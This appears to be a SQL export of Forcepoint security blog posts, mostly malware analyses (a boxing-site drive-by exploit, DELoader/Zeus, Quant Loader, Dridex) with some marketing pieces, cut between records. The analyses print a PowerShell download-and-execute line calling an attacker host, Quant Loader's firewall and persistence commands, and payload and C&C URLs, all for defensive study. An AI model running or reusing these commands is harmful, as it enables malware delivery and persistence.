The site is injected with code that attempts to silently redirect users to a third party website containing an exploit and a Russian banking trojan. The injected code employs several evasion tactics, and ensures that the redirect only occurs when there is significant user interaction on the website.\n\n\n	Hiding in Plain Sight\n\n\n	The site allboxing[.]ru is a very popular Russian boxing website receiving an estimated 3 million visitors per month.\n\n\n	\n\n\n	One of the scripts being used by the website at hxxp://allboxing[.]ru/misc/jquery.once.js?v=1.2 has been modified to include additional code. The code claims to be loading a jQuery plugin called \"jQuery Animate Plugin v1.2\" but this is in fact a fake plugin inserted by the attacker.\n\n\n	\n\n\n	Once of the giveaways here is that the URL reference for the plugin links to \"http://plugins.jquery.com/tag/animate\", whereas legitimate plugins will usually reference the project name directly such as \"http://plugins.jquery.com/project/once\". Nevertheless, the attacker has made significant effort to blend in with the legitimate content by using the same formatting and comment style.\n\n\n	The modified jquery.once.js script loads a second script from /misc/jquery.animate.js which in turn attempts to insert a script from the attacker\'s own website. The script is not inserted if the user\'s browser is either Chrome or Opera, presumably because the attacker is not able to exploit these browsers.\n\n\n	\n\n\n	The automate.js script on getcanvas[.]org then waits for user interaction before inserting an iFrame to an exploit.\n\n\n	\n\n\n	The script ensures that sufficient user interaction has occurred from either clicking, scrolling or moving the mouse. The attacker has given different weighting scores to the different types of user interaction and will only insert the iFrame once the threshold score is above 30. This is a stealth tactic used to prevent automated analysis systems from being redirected to the exploit. The technique was first documented back in 2014 in a similar infection chain.\n\n\n	Another stealth tactic employed here is the domain name and URL path which has been used. The term \"canvas\" is a well known boxing term and the URL contains the word \"sport\". This makes the URL appear a lot less suspicious considering that allboxing[.]ru is a boxing news site.\n\n\n	Exploiting Internet Explorer\n\n\n	The malicious iFrame inserted by the attacker was located at hxxp://getcanvas[.]org/sport/page/5.html. The page contains a VBScript exploit that leverages CVE-2016-0189 and attempts to run a Powershell script on the machine.\n\n\n	\n\n\n	The Powershell script decodes to the following:\n\n\n(New-Object System.Net.WebClient).DownloadFile(\"http://getcanvas.org/sport/boxing/tysonfury.jpg\",\"islzma32.exe\");(New-Object -com Shell.Application).ShellExecute(\"islzma32.exe\");\n\n\n	The script downloads and executes tysonfury.jpg which is a variant of the Buhtrap Russian banking trojan. The SHA1 of the sample we received is b74f71560e48488d2153ae2fb51207a0ac206e2b.\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - The fake jQuery plugin is identified and blocked.\n	\n		Stage 3 (Redirect) - The attempt to insert a malicious iFrame onto the page is blocked.\n	\n		Stage 4 (Exploit) - The CVE-2016-0189 exploit is identified and blocked.\n	\n		Stage 5 (Dropper) - The Buhtrap malware is prevented from being downloaded.\n	\n		Stage 6 (Call Home) - Attempts by the Buhtrap variant to call home are identified and blocked.\n\n	Summary\n\n\n	Attackers are getting better at disguising the code they inject into compromised websites. Websites with high volumes of traffic are a popular choice for attackers, and this is especially true if the bulk of the traffic is from a specific region of the world of interest to the attacker. With the recent arrests of actors using the Lurk banking trojan, Buhtrap appears to be a likely alternative for actors wishing to target Russian banks and software.\n\n\n	Indicators of Compromise\n\n\n	Compromised Website\n\n\nhxxp://allboxing.ru\n\n\n	Exploit Sites\n\n\nhttp://getcanvas.org\nhttp://medioca-room02.org\n\n\n	Buhtrap Sample (SHA1)\n\n\nb74f71560e48488d2153ae2fb51207a0ac206e2b\naa0fa4584768ce9e16d67d8c529233e99ff1bbf0\n193dd67915d544409e8c5722c22175b0f417999c\n\n\n	Buhtrap Command-and-Control Server\n\n\nhttp://91.215.153.31/r/z.php', 'https://www.forcepoint.com/blog/security-labs/highly-evasive-code-injection-awaits-user-interaction-delivering-malware\n');

Because cloud storage can expand and contract as organizations’ business needs demand, it’s an increasingly popular and cost-effective alternative to on-site data storage. However, while the cloud itself has no concrete confines, it is not exempt from the legal consequences of geographical borders and boundaries.\n\n\n	Data residency and data sovereignty laws require that digital data be subject to the laws in which that data resides. In addition, some laws require organizations to keep data on customers within the confines of the country where those customers reside. This can create difficulties when transitioning to a cloud architecture, if service providers cannot offer the flexibility to accommodate enterprise data in the required regions. Companies have ultimately delayed or forgone cloud adoption altogether, for fear of losing control of their data, if they are unsure where their data will ultimately reside in a cloud provider’s infrastructure.\n\n\n	Forcepoint is addressing data sovereignty and performance issues by rapidly opening cloud data centers* around the globe. Today sees the formal opening of our Toronto, Canada data center. Canadian businesses can now take full advantage of exceptional cloud availability, security and performance while being assured their data is housed in compliance with applicable data residency requirements.\n\n\n	Most importantly, Forcepoint’s Cloud Storage Location Preferences make it easy for customers to choose and know exactly where their data is processed and resides. Organizations that do business and store data in multiple global locations can selectively choose which forms of their enterprise data are stored where: Canadian data in Canada, French data in France, and so on.

This industry is largely about coming up with innovative solutions to common, unique, and unknown problems; it is not a field that allows anyone to stand still.\n\n\n	What would you do (for a career) if you weren’t doing this?\n\n\n	I really enjoy volunteering, so probably something in the field of philanthropy.\n\n\n	What makes Forcepoint a great place to work?\n\n\n	My work at Forcepoint is both interesting and rewarding which, along with colleagues who brighten my day, is a rare combination.\n\n\n	What does innovation mean to you?\n\n\n	I associate the word innovation with the unconventional and the exciting.\n\n\n	In your opinion, what innovation(s) have had the most impact in your lifetime so far?\n\n\n	The redefinition of the concepts of “community” and “mobility” is an innovation that has positively affected my life. There are so many options for staying easily connected with friends, industry colleagues, collaborators and coworkers, going beyond even the obvious avenues of social media. It makes life enjoyable and much more efficient.\n\n\n	 \n\n\n	Want to make a difference in today’s hyperconnected world? Join Forcepoint™.

Upon investigation we have determined the malware payload to be DELoader, which downloads a Zeus variant banking trojan upon execution.\n\n\n	E-mail Lures\n\n\n	The e-mails typically pretend to be from the Canada Revenue Agency (CRA) claiming that the individual has a tax payment outstanding.\n\n\n	\n\n\n	The e-mails contain an MSG attachment with an embedded OLE object. This is not a technique we see very often and is challenging for security products to detect due to the complicated MSG format. When the user opens the MSG attachment they are faced with the following content:\n\n\n	\n\n\n	The embedded object name \"case_243541.doc\" here is actually a spoofed object name. Double clicking on this fake document will prompt the user as to whether they wish to run a JScript file. If execution is allowed then the JScript file will begin to download and execute malware from the following URL:\n\n\nhxxp://tradestlo.top/poll.hls\n\n\n\n	Malware Payload (DELoader)\n\n\n	The malware downloaded by the malicious JScript files is a trojan downloader known as DELoader (aka Terdot). This malware has previously been used to target German nationals. In the sample we analysed (SHA1 5bfb7cbc0c79e1ce7fd4861193bd38ceeb4c8c2d) DELoader downloaded and executed a Zeus banking trojan variant from one the following URLs:\n\n\nhxxps://aspecto.top/dpr.bin\nhxxps://prisectos.top/dpr.bin\n\n\n	Contrary to previous research we do not believe DELoader to be a generic malware downloader. DELoader seems to be solely used to distribute a specific variant of the Zeus banking trojan. We unpacked the embedded DELoader DLL (SHA1 cad1715f0ffd32092001a14c5f8de6990c379867) and compared it with the Zeus variant it downloaded (SHA1 e57362eaa240da948980c4c6133d63c2a4c07b31). As a result we noticed the following connections:\n\n\n		Both use the same domains aspecto[.]top and prisectos[.]top\n	\n		Both contain the string \"shared_%s\"\n	\n		Both were compiled using Microsoft Visual Studio 2012\n	\n		Both were compiled within 20 seconds of each other according to the PE headers\n	\n		DELoader is hard-coded with an export to call in the Zeus DLL\n\n	DELoader appears to be compiled under the name \"loader.dll\" and the Zeus variant appears to be compiled under the name \"client32.dll\".\n\n\n	\n\n\n	\n\n\n	Malware Payload (Zeus Variant)\n\n\n	Zeus (aka ZBot) is an infamous banking trojan capable of intercepting and modifying online banking traffic in order to perform fraudulent transactions. It does this by injecting itself into web browsers that are running on the machine. It is also capable of stealing other credentials from the machine, enabling remote desktop access, and acting as a proxy server for an attacker.\n\n\n	In the sample we analysed the malware downloaded its main configuration file from one of the following URLs:\n\n\nhxxps://aspecto.top/dsr.bin\nhxxps://prisectos.top/dsr.bin\n\n\n	We were able to decrypt the configuration to reveal its version number, command-and-control (C&C) and a list of banking websites to steal and modify traffic from.\n\n\nVERSION\n	1.5.5.0\n\nCOMMAND AND CONTROL URL\n	hxxps://namoterno.top/promo.php\n\nALTERNATIVE CONFIG URL\n	hxxps://alecofrinse3.com/aqs.bin\n	hxxps://bielakee.xyz/cr2.bin\n	hxxps://lwowenase.top/core.bin\n \n...\n\n\n	The list of banking websites were mainly Canadian banks, with some US and Australian banks also targeted.\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n	\n		Stage 5 (Dropper File) - DELoader is prevented from being downloaded by the malicious JScript file.\n	\n		Stage 6 (Call Home) - Attempts by the Zeus variant to call home are identified and blocked.\n\n	 \n\n\n	Summary\n\n\n	The actor behind DELoader has started targeting Canadian nationals with a variant of the Zeus banking trojan. The DELoader malware itself appears to have been designed specifically for use with this Zeus variant. The Zeus code base continues to be a popular choice for malware developers looking to create a quick and easy banking trojan. It is important to be careful when opening e-mail attachments and to verify that the sender is who they say they are.\n\n\n	The Canada Revenue Agency website has additional information for recognising and protecting against fraud.\n\n\n	Blog contributors: Nick Griffin, Ran Mosessco\n\n\n	 \n\n\n	Indicators of Compromise\n\n\n	JScript Downloader (SHA1)\n\n\nf4a4a2207c8c1135a7bdf819d95e9ee22d34d733\n\n\n	DELoader (SHA1)\n\n\n5bfb7cbc0c79e1ce7fd4861193bd38ceeb4c8c2d\n\n\n	DELoader Unpacked DLL (SHA1)\n\n\ncad1715f0ffd32092001a14c5f8de6990c379867\n\n\n	Zeus Variant (SHA1)\n\n\ne57362eaa240da948980c4c6133d63c2a4c07b31\n\n\n	DELoader Payload URL\n\n\nhxxp://tradestlo.top/poll.hls\n\n\n	Zeus Variant Payload URL\n\n\nhxxps://aspecto.top/dpr.bin\nhxxps://prisectos.top/dpr.bin\n\n\n	Zeus Variant Config URLs\n\n\nhxxps://aspecto.top/dsr.bin\nhxxps://prisectos.top/dsr.bin\nhxxps://alecofrinse3.com/aqs.bin\nhxxps://bielakee.xyz/cr2.bin\nhxxps://lwowenase.top/core.bin\n\n\n	Zeus Variant C&C\n\n\nhxxps://namoterno.top/promo.php', 'https://www.forcepoint.com/blog/security-labs/zeus-delivered-deloader-defraud-customers-canadian-banks\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (137, 'Locky distributor uses newly released quant loader sold on Russian underground', 'Nicholas GriffinJohn BergbomForcepoint Security La', '\n      \n    \n      \n      \n   ', 'On September 1, 2016 a new trojan downloader became available to purchase on various Russian underground forums. Named \"Quant Loader\" by its creator, the downloader has already been used to distribute the Locky Zepto crypto-ransomware, and Pony (aka Fareit) malware families.\n\nLocky Zepto & Pony E-mail Campaign\n\nOn September 12, 2016 Forcepoint Security Labs™ noticed an e-mail campaign which was typical of one we mainly see distributing the Locky or Dridex botnet 220 malware families. The e-mails themselves masqueraded as an invoice document like the one below.\n\nThe attached ZIP file contained a malicious Windows Script File (WSF) with obfuscated Javascript. Upon execution the WSF file downloaded an encrypted payload from one of several URLs and then decrypted and executed it.\n\nIn this case the payload turned out to be something different from the usual Locky or Dridex payload. Upon further analysis we discovered that this was a newly released trojan downloader known as \"Quant Loader\". This went on to download both Locky Zepto and Pony.\n\nQuant Loader\'s Features\n\nDescribed as a \"professional exe loader / dll dropper\" Quant Loader is in fact a very basic trojan downloader. It began being advertised on September 1, 2016 on various Russian underground forums:\n\n\n\nA rough translation reveals that Quant Loader claims to include the following capabilities:\n\nSupport for downloading & executing both EXEs and DLLs\n	Privilege escalation (without using \"aggressive\" techniques)\n	An administrative control panel\n	Geographical targeting\n	Limiting the amount of downloads\n	Load balancing across servers\nQuant Loader\'s Origins\n\nQuant Loader is currently being advertised by a user known as \"MrRaiX\" aka \"DamRaiX\". This user has advertised several tools in the past including a DDoS system, a credential stealing trojan, and a BitCoin wallet stealer.\n\nAfter some digging it appears as though these malware families were developed by a Russian cybercrime team known as \"C++ GURU\" aka \"CPPGURU\". The control panel login page for Quant Loader confirms this:\n\nWe were also able to find an old image taken from their \"Madness DDoS System\" control panel:\n\nIn fact both the DDoS system and Quant Loader share a lot of the same code. A VirusTotal report from March 17, 2016 shows how the DDoS bot behaves:\n\nOur analysis of Quant Loader (below) reveals that it behaves in an almost identical manner. This discredits the claim of Quant Loader being \"developed from scratch\" as their advert states. In fact the code base is so similar that many anti-viruses already detect Quant Loader as \"Pliskal\" or \"Crugup\".\n\nQuant Loader Analysis\n\nThe Quant Loader payload used in the Locky & Pony e-mail campaign (SHA1 43be8c385b69dfb21bbee8e655068aa2aafb22a2) was packed and crypted, making static analysis difficult. The packer is not very sophisticated however, so it was trivial to unpack and extract the original binary.\n\nAfter unpacking the loader we noticed that there were still several encrypted strings. The decryption routine is a simple subtraction algorithm which intends to use the following hard-coded ASCII key:\n\n\n614b5e3c4536082dc6ec5f2a4029d69e\n\nBut the implementation here appears to be incorrect and the decryption routine skips the first byte (\"6\" or 0x36).\n\nThis mistake also results in an extra byte being read at the end of the intended ASCII key. This does not matter though because the key has a hard-coded size of 512 bytes. Ultimately the decryption routine works so the encryption routine used by the developer must use the same algorithm, albeit with an addition used instead of a subtraction.\n\nWhen the loader starts it will copy itself to %APPDATA%\\<uid>\\svchost.exe where <uid> is an eight-digit unique ID generated for the machine. The ID is generated in the following manner:\n\nObtain the Windows \"MachineGuid\" value from HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Cryptography (i.e. \"7a2cf192-7254-3a2e-b4c1-22239f61f2ac\")\n	Extract only the number values, no letters or dashes (i.e. \"721927254324122239612\")\n	Copy 8 of the numbers, beginning with the 5th number (i.e. \"27254324\")\nQuant Loader also adds a firewall rule to allow outbound traffic using the following command line:\n\n\nnetsh.exe advfirewall firewall add rule \"name=Quant\" \"program=c:\\users\\appdata\\<uid>\\svchost.exe\" dir=Out action=allow\n\nThe current user\'s permissions for the file and folder are then changed to read-only using further command line invocations:\n\n\ncmd.exe /c echo Y|CACLS \"c:\\users\\<user>\\appdata\\roaming\\<uid>\\svchost.exe\" /P \"user:R\"\ncmd.exe /c echo Y|CACLS \"c:\\users\\<user>\\appdata\\roaming\\<uid>\" /P \"user:R\"\n\nWhen the malware is re-launched under svchost.exe it proceeds to write a file to %temp%\\per with the following contents:\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [7]\n\nThis file is then used as the parameter for regini.exe with the following command line:\n\n\nregini.exe C:\\Users\\<user>\\Local\\Temp\\per\n\nThis grants full world access to the registry key, ensuring that the malware can write to it. A new value is then written to the registry key to make Quant Loader persistent on the system:\n\nThe registry key permissions are then changed to world read-only by using the %temp%\\per file and regini.exe again with the following content in the \"per\" file:\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [8]\n\nThis of course prevents the user from deleting the key unless they manually change the permissions back to read/write.\n\nFinally, the malware decrypts its command-and-control (C&C) addresses and sends a request to each of them containing the following fields:\n\n\"id\" - the unique ID of the machine based on the \"MachineGuid\" registry value\n	\"c\" - the current index of the server being used (i.e. if this is the first server contacted, the value will be \"1\")\n	\"mk\" - a hard-coded string likely used as an affiliate or campaign identifier\nQuant Loader will then receive back a list of EXEs and DLLs to download and execute.\n\nDuring our analysis we saw no evidence of the privilege escalation claims given in the Quant Loader advert. This capability may or may not exist in some versions, or may be sent back by the C&C in the form of an EXE or DLL to execute.\n\nProtection Statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n	Stage 5 (Dropper File) - The Quant Loader, Locky Zepto, and Pony malware files are prevented from being downloaded.\n	Stage 6 (Call Home) - Attempts by Quant Loader and Pony to contact their C&C servers are blocked.\nSummary\n\nCriminals continue to look for new ways to distribute their malware in order to bypass security products. Within two weeks of a new downloader being made available on the Russian underground an actor distributing the Locky and Pony malware families began using it. The advertisement for the downloader makes claims that do not hold up to scrutiny, but we expect the malware to be improved in the future. We will continue to monitor activity on Russian crime forums advertising Quant Loader.\n\nBlog contributors: Nick Griffin, Ran Mosessco\n\nIndicators of Compromise\n\nWSF Downloader Samples (SHA1)\n\n\nd4594309ff5c94673e34f447c8a8366175e9f572\n67660ea4822f06618aedde3571b79674089429b8\n8e7d6467bb812d03a6ea422ff8aa2129abb88a77\n\nQuant Loader Sample (SHA1)\n\n\n43be8c385b69dfb21bbee8e655068aa2aafb22a2\n\n\nLocky Zepto Sample (SHA1)\n\n\nddc92ae95c68145fd5331e408cdb58dafd637821\n\nPony Sample (SHA1)\n\n\n75277bf9896f029fbabcb0f6e301d34942948a07\n\nWSF Downloader Payload URLs (Quant Loader)\n\n\nhxxp://abcdraw.biz/8fh34f3\nhxxp://adasurgical.com/8fh34f3\nhxxp://adss30.net/8fh34f3\nhxxp://allcateringservices.in/8fh34f3\nhxxp://ativa3.tempsite.ws/8fh34f3\nhxxp://aycilinsaat.com/8fh34f3\nhxxp://bangbang55.com/8fh34f3\nhxxp://biogreentech.in/8fh34f3\nhxxp://cardimax.com.ph/8fh34f3\nhxxp://cbautocare.com.au/8fh34f3\nhxxp://clickroses.com/8fh34f3\nhxxp://craskart.com/8fh34f3\nhxxp://dashingleather.com/8fh34f3\nhxxp://demo.hubliclick.in/8fh34f3\nhxxp://eaglecorp.nl/8fh34f3\nhxxp://files.mostafaahmadi.ir/8fh34f3\nhxxp://gift2belgaum.com/8fh34f3\nhxxp://goldenladywedding.com/8fh34f3\nhxxp://gunturnayeebrahminemployees.com/8fh34f3\nhxxp://herosoft.biz/8fh34f3\nhxxp://hostit.co.in/8fh34f3\nhxxp://iandiinternational.com/8fh34f3\nhxxp://jmetalloysllp.com/8fh34f3\nhxxp://kitsgnt.com/8fh34f3\nhxxp://mylespollard.com.au/8fh34f3\nhxxp://partyeazy.com/8fh34f3\nhxxp://perfectfixuae.com/8fh34f3\nhxxp://platformarchitects.com.au/8fh34f3\nhxxp://platforms-root-technologies.com/8fh34f3\nhxxp://pmlojistik.com/8fh34f3\nhxxp://samssara.com/8fh34f3\nhxxp://sasmgs.org/8fh34f3\nhxxp://scpolytechnic.com/8fh34f3\nhxxp://site1382371826.provisorio.ws/8fh34f3\nhxxp://sowhatresearch.com.au/8fh34f3\nhxxp://syamasahithi.com/8fh34f3\nhxxp://synergyconnect.in/8fh34f3\nhxxp://synergywaterproofing.com.au/8fh34f3\nhxxp://Ungelie.com/8fh34f3\nhxxp://utsavi.net/8fh34f3\nhxxp://vajrammatrimony.com/8fh34f3\nhxxp://wamasoftware.com/8fh34f3\nhxxp://websamrat.in/8fh34f3\nhxxp://www.alfajerdecor.com/8fh34f3\nhxxp://www.ausaf.pk/8fh34f3\nhxxp://www.jmetalloysllp.com/8fh34f3\nhxxp://www.mehrabtech.ae/8fh34f3\nhxxp://www.pstimes.com/8fh34f3\nhxxp://www.rajashekharkubasad.com/8fh34f3\nhxxp://www.villakeratea.it/8fh34f3\nhxxp://yesiloglugrup.com/8fh34f3\n\nQuant Loader C&Cs\n\n\nhxxp://kruibhez.ws\nhxxp://ufqeatci.org\n\nLocky Zepto & Pony Payload URLs\n\n\nhxxp://supperuploadtestspeed.ws/1.dll\nhxxp://factumtech.com/p.exe\nhxxp://shagunproperty.com/1.dll\n\nPony C&C\n\n\nhxxp://supperuploadtestspeed.ws', 'https://www.forcepoint.com/blog/security-labs/locky-distributor-uses-newly-released-quant-loader-sold-russian-underground\n');

Before I go any further, let’s recap #5 through #2 in my list:\n\n\n		Web security that was more than URL filtering, and worked off-network\n	\n		The ability to detect and block threats BEFORE they were delivered to users\n	\n		I wanted systems that talked to one another and were EASY TO MANAGE\n	\n		I wanted open communication with others to SHARE threat info and best practices\n\n	You will quickly see the view of the CISO in this last entry. CISOs are accountable for helping their organization manage information risk. As part of that responsibility they need to be able to communicate risks, action plans and security program maturity to the board of directors, C-level executives, audit committee and other executives. Ten years ago, the reporting tools available lacked maturity and lacked a truly risk-based focus.\n\n\n	#1 – I wanted REPORTING that was valuable and risk-based\n\n\n	If I think back to the security tools and methods being leveraged 10 years ago, security and IT teams understood the need to retain log files, but very few groups I talked to actually took time to review log files and look for suspicious activity. SIEMs existed but weren’t mature in their ability to correlate and alert in an automated fashion. From my viewpoint, reporting was still in its infancy. We could get reports of activity volume, but nothing I would consider very meaningful in helping drive risk reduction across the enterprise.\n\n\n	If I ponder the evolution in this area, it went from separate log files across different systems to log aggregation in SIEM tools. Things got better with prioritization of events into Critical, High, Medium or Low categories, but even so events were still not intelligently grouped into potential incidents. What I’ve started to see in 2015-16 is the next evolution. Vendors have come to realize that security controls are mitigation activities within a cyber risk management program. For organizations to get the most value out of reporting, it needs to present data in terms of risk to the organization. This is not only important for the organization to understand its risk, but it’s critically important to operational teams who use this information every day, so they can focus their limited resources on those risks that are most important to the organization at that particular point in time.\n\n\n	To effectively present security event data in risk terms, organizations need to understand and be able to articulate what data and what systems are most critical to the organization. This can be done via an activity such as a business impact assessment. By incorporating such information into the security event reporting processes, events can not only be grouped by source or target, but the activities can be correlated with the risk posture of the assets involved and dashboards can present a view of activity that identifies the most important risks to the organizations assets at that point in time. As risk incidents are investigated and addressed by relevant groups, they will fall off the dashboard and the next most critical risk will rise up on the dashboard. If you haven’t seen any of these dashboards yet, they will present data in sections such as Top Threats, Top Riskiest Assets and Top Riskiest Users. I can’t underscore how important these real-time risk-based dashboards are to organizations with limited security resources, as this allows them to stop spending time on non-value-add activities of trying to sift through SIEM data and lists of DLP items to determine what needs to be remediated. This allows them to focus on risks that are most critical to the organization at that moment in time. Management can then be sure resources stay focused on risks most important to the security risk posture of the organization.\n\n\n	Well, there you have it.  My Top Five desired capabilities from 2006 that are a reality today. I’m not claiming these were necessarily the most important five, and I’m sure some readers may have a different list of what they most wanted in 2006. It’s fair to say security technologies have advanced significantly since then, and I anticipate the speed of capability advancement to continue to accelerate into the foreseeable future. I feel fortunate to have the technological capabilities we have available to us today, and with the amount of innovation taking place, I’m truly excited about what’s to come.\n\n\n	 \n\n\n	To learn more about a technology that delivers these security capabilities, visit: https://www.forcepoint.com/solutions/need/unified-content-security', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-2\n');

I’ve always been a very strong advocate for collaboration and information sharing, regardless of the industry in which I worked. I think this was sparked in me back in my days at Accenture working in the Office of the CIO. We knew as a consulting organization, we needed to collaborate and share best practices across the company. When it comes to cybersecurity defenses and preparedness, however, the need to share and leverage knowledge extends beyond your own company’s boundaries. To recap, here’s the items I’ve discussed so far:\n\n\n		Web security that was more than URL filtering, and worked off-network\n	\n		The ability to detect and block threats BEFORE they were delivered to users\n	\n		I wanted systems that talked to one another and were EASY TO MANAGE\n\n	#2 – I wanted open communication with others to SHARE threat info and best practices \n\n\n	As my career in security and privacy began to mature, I quickly realized that the best path forward to advancing security capabilities was to collaborate. That meant looking for peers, industry groups, government entities, etc. that would be willing to sit down and collaborate for the good of everyone involved. At the time, I was working in financial services so I turned to the Financial Services Roundtable, Information Security Forum and Corporate Executive Board for assistance. Although some minor assistance could be had, companies and government entities were still very secretive and unwilling to share at a truly meaningful level.\n\n\n	When I stepped into the healthcare industry in 2012 it was even more clear that collaboration was crucial to success. That’s why in 2013, a colleague and I started the Michigan Healthcare Cybersecurity Council. Maybe it’s because most are community based non-profit entities with very small security teams, but I found healthcare entities to be much more willing to share information. Over the past few years, the US government has stepped up and not only promoted public-private sharing of threat indicators, but passed the Cybersecurity Information Sharing Act of 2015 (CISA). In June 2016 guidance was also indicating that non-government entities can also receive liability protection for sharing information across non-government entities, provided information is shared in accordance with the guidelines under CISA. In addition, US-CERT has published very specific technology implementation guidance using STIX and TAXII protocols to aid companies in sharing and leveraging threat indicators with other entities. So I’m happy to say cyber threat information sharing is possible (and encouraged) today.\n\n\n	All this being said, what I hear from CISOs is still confusion as to what the term “threat intelligence” really means, and how to leverage it effectively to improve a security program. Is it the sharing of threat indicators with government and peer organizations? Is it the research and intelligence my security vendor is already leveraging to protect us? I see sharing happening mostly via informal methods from which value is difficult to get. In my opinion, threat intelligence sharing needs to be automated to make it truly useful and valuable for companies. I have learned that some groups (such as FS-ISAC, state governments and private companies with some more advanced capabilities) have been able to effectively shared threat intelligence, but for most companies, the automated execution of these capabilities remains a challenge to be conquered some day in the future.\n\n\n	Though threat intelligence and indicator sharing automation may remain elusive to some organizations today, I’m very encouraged by the amount of focus organizations, consortiums and government organizations have put toward this common goal.

To recap, here’s the items I’ve discussed so far:\n\n\n		Web security that was more than URL filtering, and worked off-network\n	\n		The ability to detect and block threats BEFORE they were delivered to users\n\n	As I share my perspectives on #3, efficiency is the main theme. Having been a CISO at a healthcare provider and interacting with CISOs from other healthcare entities, operational efficiency is an absolute necessity for resource-constrained information security programs.\n\n\n	#3 – I wanted systems that would talk to one another, and would be easy to manage\n\n\n	In 2006, not many security tools talked to each other in a useful or productive manner. Some vendors had multiple security products that didn’t really integrate, and if you had security products from multiple vendors (which most of us did), you were stuck managing each one separately and trying to develop a reporting capability that could make some sense out of all the disparate data that was available. As a result, reporting was usually terrible and each time you added more tools, you needed to add staff to manage them.\n\n\n	There are some very unique and interesting technologies and methods available in 2016, such as machine-based malware detection, user behavior analytics, crowd-sourced bug detection, etc. that have actually made this problem worse in some regard. The proliferation of security products and security vendors has made it very difficult for CISOs and security leaders to determine the best path forward and has caused significant point product fatigue. There are a few vendors out there, however, that either provide truly integrated platforms (Forcepoint for example) or have collaborated with a number of other security technology companies to allow their products to work seamlessly. Integrated security platforms are necessary for effectiveness and efficiency as they are comprehensive, they have integrated threat intelligence and reporting capabilities and they can be adaptive to the needs of the business. For those enterprises with small security teams, integrated tools and integrated reporting are an absolute must. For a more thorough summary on the value of integrated security solutions, see my blog on the topic here.\n\n\n	I’m fortunate to have worked with some good security vendors and used some security tools that truly integrated. As the next few years unfold, I anticipate security partners will continue their efforts to reduce point product fatigue and truly help security teams be more efficient.

Part one began at the bottom with #5 - web security. As we step up to #4 in my Top Five list, you’ll discover my aspiration in 2006 to be proactive, not reactive.\n\n\n	#4 – I wanted technology that would identify threats and block them BEFORE they were delivered to users. \n\n\n	It used to be commonplace to see an antivirus popup message saying it detected a virus and was looking for user input on what to do next. This meant that the infected or malicious file had already penetrated your perimeter defenses and made its way to a PC. This caused many security teams to live in a reactive state, where incident teams would simply respond to malware events as they occurred.\n\n\n	In 2016, several security market leaders have capabilities that integrate to assist in blocking threats before they reach end user PCs. On top of the malware protections now built into web security gateways and next gen firewalls, both web link and email attachment sandboxing have become commonplace. These solutions attempt to “detonate” malicious content or URL links in a virtual sandbox by identifying and blocking incoming threats before they reach their destination. This means that links to malicious or inappropriate sites are stripped from the email altogether so users can’t expose the company by clicking on them. Add to that a critical protection I refer to as “click-time” web protection, where URL links in email messages or on web pages are analyzed and evaluated at the point in time they are clicked. That is very important as criminals have learned to “take over” web sites or put up new pages on legitimate web sites after the email link has made its way through incoming corporate email and web filters. So without click-time protection, a user could receive a link to a legitimate web site and the incoming filter would not block it. A threat actor could alter the web site or pages the next day, then 3 days later when the users opens the email and clicks the link, he’s taken to the malicious page. Click-time protection re-evaluates that link at the point the user clicks on it to protect companies and individuals from such tactics.\n\n\n	Although the threat landscape in 2016 is significantly different than it was in 2006, the security technologies available today help teams address threats in a much more proactive fashion. That’s not to say security incidents don’t happen – we all can see that from the media – but hopefully we’re narrowing all our attack surfaces so that the occurrence of incidents is far less frequent. Stay tuned for the next in this series where I will discuss what made #3 in the Top Five security technologies I wished for a decade ago.\n\n\n	To learn more about a technology that delivers these security capabilities, visit:https://www.forcepoint.com/solutions/need/unified-content-security', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (142, 'Dridex in the shadows - blacklisting, stealth, and crypto-currency', 'Nicholas GriffinJohn BergbomForcepoint Security La', '\n      \n    \n      \n      \n   ', 'Command-and-Control (C&C) blacklisting\n\nThe initial Dridex executable is known as the Dridex Loader.  It is responsible for checking in to its C&C servers, requesting the \"bot\" module and a \"list\" of peers to communicate with. The module contains all of the core Dridex functionality and is known as the \"worker\". \n\nRecently we have seen that the Dridex loader C&Cs refuse to send back these payloads if the initial check-in information does not pass some simple criteria. Instead the response is a 403 HTTP error code.\n\n\n\nThe check-in information sent from the loader [see above] contains a variety of information about the user\'s machine and environment. The sizes are all defined in big endian format.\n\nInformation sent to the C&C includes the user\'s computer name, user name, installation date of the operating system, operation system version, and a list of installed software. As a result, the Dridex operators have been able to build up profiles of commercial sandboxes and researcher VMs.\n\nBlacklisting.  It has now become trivial for the Dridex operators to blacklist these machines in an attempt to prevent them from obtaining the core module and list of peers. This makes it more difficult for automated analysis systems to find and block the appropriate IPs. During our recent analysis we noticed that one of our VMs had been blacklisted based on its user name and operating system installation date, which of course was trivial for us to bypass once we knew what was going on.\n\nProtecting the assets\n\nEarlier versions of the Dridex loader predating November 2015 contained an XML structure which listed the botnet ID and C&C IPs. From November 11, 2015 onwards, this was changed to a binary structure to make analysis more difficult. The core module was still using XML for its settings up until March 2016, at which point they changed over to a multi-layered encrypted binary format with Dridex version 3.188 (196796).\n\n\n\nOther parts of Dridex have also gradually moved away from XML in favour of more complicated binary formats, making the trojan an ever more challenging threat to analyse.\n\nMain configuration\n\nDespite the protections put in place by the Dridex developer(s), it is still very much possible to reconstruct the Dridex settings configuration file received by the core module. This configuration file includes the list of banking websites to capture data from and inject code into when infecting a user\'s browser.\n\nAfter decryption, each section of the new binary format can be loosely represented as follows:\n\n\ntype         (BYTE)             - the element type (1-12)\nsize         (WORD)             - the size of the element\'s content\ncontent      (variable length)  - the content of the element\n\nElement types appear to range between 1 and 12 and define what type of data is contained in the content. For example, element type 11 defines the \"node_tick_interval\" element where the content contains two WORD 